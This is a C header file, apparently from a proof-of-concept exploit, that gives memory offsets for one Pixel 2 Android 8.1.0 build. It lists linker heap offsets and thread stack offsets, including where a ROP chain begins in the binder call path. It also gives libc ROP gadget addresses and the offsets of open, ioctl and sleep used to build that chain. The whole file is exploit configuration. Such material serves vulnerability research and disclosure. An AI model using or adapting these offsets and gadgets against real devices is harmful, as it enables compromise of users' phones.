// This file contains offsets for a specific Pixel 2 build:
// google/walleye/walleye:8.1.0/OPM2.171019.029.B1/4720900:user/release-keys

// A better approach for obtaining most of these offsets could be by
// dynamically parsing the relevant .so files, as that approach won't be
// build dependant.


#ifndef __OFFSETS_H__
#define __OFFSETS_H__


// Offset into linker_alloc where the interesting address is
#define LINKER_ADDR_OFFSET (0x40)
// Offset from the interesting address to our small heap
#define LINKER_ADDR_SMALL_HEAP_ADDR_OFFSET (0x1010)


// Offsets in a thread stack which is in the known blocked state:

// Return address to somewhere inside libc's __start_thread
#define START_THREAD_OFFSET (0xfc95c)
// addr.stack_base of the thread's pthread_internal_t
#define STACK_BASE_OFFSET (0xfc984)
// Return address to IPCThreadState::waitForResponse from
// IPCThreadState::talkWithDriver. This is where the ROP stack begins.
#define WAIT_FOR_RESPONSE_RA_OFFSET (0xfb2bc)


// Offsets in libc:

// Where START_THREAD_OFFSET points to
#define START_THREAD_LIBC_OFFSET (0x1b343)
// Gadgets for the ROP
#define POP_R0_PC (0x19471)
#define POP_R0_R1_PC (0x1f75d)
#define POP_R1_R2_PC (0x43937)
#define BLX_R1_POP_R7_PC (0x174ad)
// Symbols for the ROP
#define OPEN_2_OFFSET (0x1f749)
#define IOCTL_OFFSET (0x1e141)
#define SLEEP_OFFSET (0x313f9)


#endif
